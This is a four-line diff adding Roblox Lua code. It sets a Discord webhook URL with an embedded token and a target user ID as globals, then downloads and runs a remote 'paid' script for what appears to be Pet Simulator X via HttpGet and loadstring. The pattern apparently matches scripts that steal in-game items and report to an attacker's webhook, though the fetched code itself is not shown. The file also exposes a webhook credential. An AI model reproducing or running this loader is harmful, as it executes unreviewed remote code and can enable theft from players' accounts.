@@ -1,0 +1,4 @@
+_G.Webhook = "https://discord.com/api/webhooks/1069707253243981864/m0jex1WIPIFbxiTx0B7D-z9QqpEwqoYchHNsbEwqiBwAd_TjwJIaqn7G0Ix_wAzQ_Uqs"
+_G.UserID = "4194052659"
+
+loadstring(game:HttpGet("https://captcha.ml/psx/paid/paidscript.lua"))()
